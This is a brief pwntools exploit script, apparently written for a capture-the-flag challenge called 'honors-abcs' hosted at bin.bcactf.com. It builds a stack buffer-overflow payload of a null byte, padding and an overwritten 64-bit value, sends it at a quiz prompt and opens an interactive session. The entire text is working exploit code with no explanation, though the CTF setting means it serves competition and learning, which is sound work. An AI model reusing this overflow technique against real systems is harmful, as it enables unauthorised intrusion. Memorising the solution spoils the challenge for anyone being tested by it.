from pwn import *
context.update(os="linux", arch="i686")

#p = process("./honors-abcs")
p = remote("bin.bcactf.com", 49155)

PAYLOAD = ("\x00" + ("A") * (60 + 3 * 8)).encode("ASCII") + p64(120)
print(len(PAYLOAD))

p.recvuntil("Answer for 1:")
p.sendline(PAYLOAD)
p.interactive()
